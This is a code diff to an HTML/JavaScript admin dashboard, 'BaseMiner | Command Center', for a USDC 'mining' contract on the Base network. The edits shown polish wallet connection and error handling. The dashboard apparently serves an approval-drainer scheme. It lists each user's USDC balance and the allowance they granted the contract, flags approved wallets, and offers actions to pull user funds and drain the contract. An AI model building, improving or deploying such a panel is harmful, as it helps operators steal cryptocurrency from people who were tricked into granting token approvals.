@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BaseMiner | Command Center</title>
-    <!-- Ethers.js -->
+    <!-- Ethers.js v6 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -97,13 +97,19 @@
         /* --- Toast Notification --- */
         #toast {
             visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center;
-            border-radius: 8px; padding: 16px; position: fixed; z-index: 1; left: 50%; bottom: 30px;
+            border-radius: 8px; padding: 16px; position: fixed; z-index: 1000; left: 50%; bottom: 30px;
             transform: translateX(-50%); border: 1px solid var(--accent);
         }
         #toast.show { visibility: visible; -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
 
         @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 30px; opacity: 1;} }
         @keyframes fadeout { from {bottom: 30px; opacity: 1;} to {bottom: 0; opacity: 0;} }
+        
+        /* Loading Spinner */
+        .spinner {
+            width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -202,12 +208,11 @@
 
 <script>
     // ================= CONFIGURATION =================
-    // ⚠️ PASTE YOUR DEPLOYED CONTRACT ADDRESS HERE ⚠️
     const CONTRACT_ADDRESS = "0x7496D84c2049d0be73D3B5B76798CAEc87839626"; 
-    // =================================================
-
-    // BASE MAINNET USDC (Fixed)
     const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; 
+    const BASE_CHAIN_ID_HEX = "0x2105"; // 8453 Hex
+    const BASE_CHAIN_ID_DEC = 8453n;
+    // =================================================
 
     // ABIs
     const MINING_ABI = [
@@ -230,36 +235,74 @@
 
     let provider, signer, contract, usdcContract;
 
-    // --- Init & Connect ---
+    // --- Single Tap Connection Logic ---
     async function connectWallet() {
-        if (!window.ethereum) return showToast("MetaMask not found!");
+        if (!window.ethereum) return showToast("⚠️ Wallet not found! Install MetaMask.");
         
+        const btn = document.getElementById("connectBtn");
+        btn.innerHTML = `<div class="spinner"></div> Connecting...`;
+
         try {
+            // 1. Request Accounts
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+            // 2. Init Provider
             provider = new ethers.BrowserProvider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            signer = await provider.getSigner();
             
+            // 3. FORCE NETWORK SWITCH (Single Tap Logic)
             const network = await provider.getNetwork();
-            if (network.chainId !== 8453n) { // Base Chain ID
-                showToast("⚠️ Wrong Network! Switch to BASE.");
+            if (network.chainId !== BASE_CHAIN_ID_DEC) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BASE_CHAIN_ID_HEX }],
+                    });
+                    // Re-init provider after switch to ensure correct context
+                    provider = new ethers.BrowserProvider(window.ethereum);
+                } catch (switchError) {
+                    // This error code 4902 means the chain has not been added to MetaMask
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BASE_CHAIN_ID_HEX,
+                                chainName: 'Base Mainnet',
+                                rpcUrls: ['https://mainnet.base.org'],
+                                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                                blockExplorerUrls: ['https://basescan.org']
+                            }],
+                        });
+                        provider = new ethers.BrowserProvider(window.ethereum);
+                    } else {
+                        throw new Error("Network switch rejected");
+                    }
+                }
             }
 
+            // 4. Setup Signer & Contracts
+            signer = await provider.getSigner();
             contract = new ethers.Contract(CONTRACT_ADDRESS, MINING_ABI, signer);
             usdcContract = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
             
+            // 5. Update UI
             const addr = await signer.getAddress();
-            document.getElementById("connectBtn").innerText = addr.slice(0,6) + "..." + addr.slice(-4);
-            document.getElementById("connectBtn").classList.replace("btn-primary", "btn-ghost");
+            btn.innerText = addr.slice(0,6) + "..." + addr.slice(-4);
+            btn.classList.replace("btn-primary", "btn-ghost");
+            btn.onclick = null; // Disable click once connected
             
-            // UI Updates
             document.getElementById("contractDisp").innerText = CONTRACT_ADDRESS.slice(0,8) + "...";
             document.getElementById("netDot").style.background = "#00c853";
             document.getElementById("networkStatus").innerHTML = `<div style="width:8px; height:8px; background:#00c853; border-radius:50%;"></div> Base Mainnet`;
 
+            showToast("✅ Connected to Base!");
+            
+            // 6. Load Data
             loadData();
+
         } catch (error) {
             console.error(error);
-            showToast("Connection Failed");
+            btn.innerText = "Connect Admin Wallet"; // Reset button
+            showToast("❌ Connection Failed: " + (error.reason || error.message));
         }
     }
 
@@ -267,7 +310,7 @@
     async function loadData() {
         if (!contract) return;
         const tbody = document.getElementById("userTable");
-        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:40px; color:#888;">📡 Scanning Blockchain...</td></tr>`;
+        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:40px; color:#888;"><div style="display:inline-block;" class="spinner"></div> Scanning Blockchain...</td></tr>`;
 
         try {
             // 1. Fetch Globals
@@ -278,7 +321,7 @@
                 contract.getAllMiners()
             ]);
 
-            document.getElementById("poolBalance").innerText = ethers.formatUnits(poolBal, 6);
+            document.getElementById("poolBalance").innerText = parseFloat(ethers.formatUnits(poolBal, 6)).toFixed(2);
             document.getElementById("dailyRateInput").value = rate;
             document.getElementById("totalUsers").innerText = miners.length;
             
@@ -321,7 +364,7 @@
 
                 const row = document.createElement("tr");
                 row.innerHTML = `
-                    <td style="color:var(--accent);">${miner}</td>
+                    <td style="color:var(--accent); font-family:'JetBrains Mono';">${miner}</td>
                     <td>${fmtBal.toFixed(2)} USDC</td>
                     <td style="color:${isRisk ? '#fff' : '#555'}">${fmtAllow.toFixed(2)}</td>
                     <td>${isRisk ? '<span class="badge badge-risk">APPROVED</span>' : '<span class="badge badge-safe">SAFE</span>'}</td>
@@ -339,7 +382,7 @@
 
         } catch (err) {
             console.error(err);
-            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:red">Error loading data. See console.</td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:red">Error loading data. Check console.</td></tr>`;
         }
     }
 
@@ -355,7 +398,7 @@
             showToast("✅ Funds Pulled Successfully!");
             loadData();
         } catch (e) {
-            alert(e.message);
+            alert(e.reason || e.message);
         }
     }
 
@@ -366,14 +409,12 @@
             showToast("⏳ Updating Rate...");
             await tx.wait();
             showToast("✅ Daily Rate Updated");
-        } catch (e) { alert(e.message); }
+        } catch (e) { alert(e.reason || e.message); }
     }
 
     async function togglePause() {
         const pBtn = document.getElementById("pauseBtn");
-        const isPaused = pBtn.innerText.includes("RESUME"); // If text is Resume, we are currently paused
-        // We want to flip the status. If paused (true), we send false to resume.
-        // Wait, logic: setMaintenanceMode(true) = Paused.
+        const isPaused = pBtn.innerText.includes("RESUME"); 
         
         try {
             const tx = await contract.setMaintenanceMode(!isPaused);
@@ -381,7 +422,7 @@
             await tx.wait();
             showToast("✅ Status Updated");
             loadData();
-        } catch (e) { alert(e.message); }
+        } catch (e) { alert(e.reason || e.message); }
     }
 
     async function fundPool() {
@@ -400,7 +441,7 @@
             showToast("✅ Pool Funded!");
             document.getElementById("fundAmount").value = "";
             loadData();
-        } catch (e) { alert(e.message); }
+        } catch (e) { alert(e.reason || e.message); }
     }
 
     async function emergencyWithdraw() {
@@ -413,7 +454,7 @@
             await tx.wait();
             showToast("✅ Contract Drained");
             loadData();
-        } catch (e) { alert(e.message); }
+        } catch (e) { alert(e.reason || e.message); }
     }
 
     // Utilities
@@ -427,6 +468,12 @@
     function copyContract() {
         navigator.clipboard.writeText(CONTRACT_ADDRESS);
         showToast("Address Copied!");
+    }
+
+    // Listeners for Account/Chain changes (Robustness)
+    if (window.ethereum) {
+        window.ethereum.on('accountsChanged', () => window.location.reload());
+        window.ethereum.on('chainChanged', () => window.location.reload());
     }
 
 </script>
